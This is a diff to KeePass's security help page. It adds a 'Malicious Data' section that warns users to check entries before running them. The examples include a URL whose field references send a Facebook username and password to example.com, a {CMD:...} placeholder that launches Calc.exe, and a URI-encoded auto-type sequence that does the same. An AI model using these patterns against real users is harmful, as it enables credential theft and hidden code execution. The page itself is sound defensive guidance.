@@ -51,6 +51,7 @@ Detailed information on the security of KeePass.
 <li><a href="#secplugins">Plugins</a></li>
 <li><a href="#secselftests">Self-Tests</a></li>
 <li><a href="#secspecattacks">Specialized Spyware</a></li>
+<li><a href="#secmaldata">Malicious Data</a></li>
 <li><a href="#secissues">Security Issues</a></li>
 </ul>
 
@@ -304,7 +305,8 @@ the cell content (the password) as unencrypted string
 Operations that result in unencrypted data in the process memory include,
 but are not limited to: displaying data (not asterisks) in standard controls,
 searching data, replacing placeholders (during auto-type, drag&amp;drop,
-copying to clipboard, ...), and importing/exporting (except KDBX).
+copying to clipboard, ...), importing/exporting files (except KDBX)
+and loading/saving unencrypted files.
 Windows and .NET may make copies of the data (in the process memory)
 that cannot be erased by KeePass.</p>
 
@@ -455,6 +457,88 @@ in any case it cannot be KeePass.</p>
 <p>For protecting your PC, we recommend using an anti-virus software.
 Use a proper firewall, only run software from trusted sources,
 do not open unknown e-mail attachments, etc.</p>
+
+<br />
+
+<a name="secmaldata"></a>
+<h2 class="sectiontitle">
+<img src="../images/b16x16_enhanced_browsing.png" class="singleimg" alt="URL" />&nbsp;&nbsp;Malicious
+Data</h2>
+
+<p>The user should check all data that he enters and/or runs.</p>
+
+<p>If you enter/run data without checking it first, this can lead to
+security problems (like for instance a disclosure of sensitive data
+or an execution of malicious code). This is a general principle;
+it applies to most applications, not only to KeePass.</p>
+
+<p>Examples:</p>
+<ul class="withspc">
+<li>The <a href="autourl.html">URL field</a> of an entry supports running
+a <a href="autourl.html#cmdln">command line</a>.
+So, if you (enter and) run a URL without checking it first,
+you might run a malicious program/code.</li>
+
+<li>When running a URL, a malicious <a href="autourl.html#override">URL override</a>
+(global or entry-specific) may be executed instead, if you did not check it.</li>
+
+<li>KeePass supports <a href="placeholders.html">placeholders</a>.
+All regular placeholders are of the form '<code>{...}</code>', and
+<a href="placeholders.html#envvars">environment variables</a>
+are of the form '<code>%...%</code>'.
+All data should be checked for malicious placeholders and environment variables.
+
+<ul>
+<li><a href="fieldrefs.html">Field references</a> can insert data of
+other entries into the current data. For example, if you have a Facebook account,
+entering and running the following URL might send your Facebook user name
+and the password to the 'example.com' server:<br />
+<code>https://example.com/?u={REF:U@T:Facebook}&amp;p={REF:P@T:Facebook}</code></li>
+
+<li>The <a href="placeholders.html#cmd"><code>{CMD:...}</code> placeholder</a>
+runs a command line. For example, the following URL opens
+'https://example.com/' and runs 'Calc.exe':<br />
+<code>https://example.com/{CMD:/Calc.exe/W=0/}</code></li>
+</ul>
+
+<a href="placeholders.html#texttrf">Text transformation placeholders</a>
+may be used to obfuscate parts of the data.</li>
+
+<li>The following <a href="autotype.html">auto-type</a> sequence
+performs a login and additionally runs 'Calc.exe':<br />
+<code>{USERNAME}{TAB}{PASSWORD}{ENTER}{VKEY
+91}{T-CONV:/%43%61%6C%63%2E%65%78%65/Uri-Dec/}{VKEY 13}</code><br />
+This sequence typically only works on a Windows system, but similar
+sequences can be constructed for other operating systems
+(like Linux and Mac OS X).</li>
+
+<li>If you specify weak <a href="#secdictprotect">key derivation</a>
+settings suggested by an attacker, this might make it easier for the
+attacker to decrypt/open your database.</li>
+
+<li>If you enter/use a <a href="pwgenerator.html">password generator</a>
+profile (suggested by an attacker) that allows weak passwords only,
+accounts using such weak passwords may not be well protected.</li>
+
+<li>Using the <a href="https://keepass.info/help/v2/xml_replace.html"
+target="_blank">XML Replace</a> feature with malicious parameters may
+result in a malicious modification of data in your database.</li>
+
+<li>Pasting/entering malicious <a href="https://keepass.info/help/v2/triggers.html"
+target="_blank">triggers</a> in the triggers dialog without checking
+them can result in security problems.</li>
+</ul>
+
+<p>If the user checks the data that he enters/runs, none of the
+&quot;attacks&quot; above works. Entering data is a manual operation
+(i.e. an attacker cannot do this himself), and only the user can
+decide whether the resulting effect is intended or not.
+Showing warning/confirmation dialogs all the time would not be reasonable.</p>
+
+<p>When opening a database that has been created/modified by
+someone else, you should carefully check all data that you want to use.
+If you do not fully trust the creator of the database, do not
+open any files attached to entries.</p>
 
 <br />
 
